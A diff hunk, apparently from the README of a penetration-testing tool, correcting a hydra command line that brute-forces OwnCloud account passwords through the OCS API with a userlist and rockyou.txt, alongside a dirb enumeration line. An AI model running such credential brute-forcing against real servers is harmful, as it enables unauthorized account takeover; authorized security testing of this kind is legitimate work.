@@ -27,7 +27,7 @@ dirb https://testdomain.org owncloud_files.txt
 Bruteforce OwnCloud accounts using it's OCS API.
 
 Note that these scripts (ocrk.sh and ocrk.py) were written for educational purposes and you can also use hydra:
-hydra domain.org https-post-form "/ocs/v1.php/person/check:login=^USER^&password=^PASS^:<status>ok</status>" -L userlist.txt -P rockyou.txt -vv 
+hydra domain.org https-post-form "/ocs/v1.php/person/check:login=^USER^&password=^PASS^:S=<status>ok</status>" -L userlist.txt -P rockyou.txt -vv 
 
 ocrk help with the "-h" switch: ./ocrk.sh -h
 
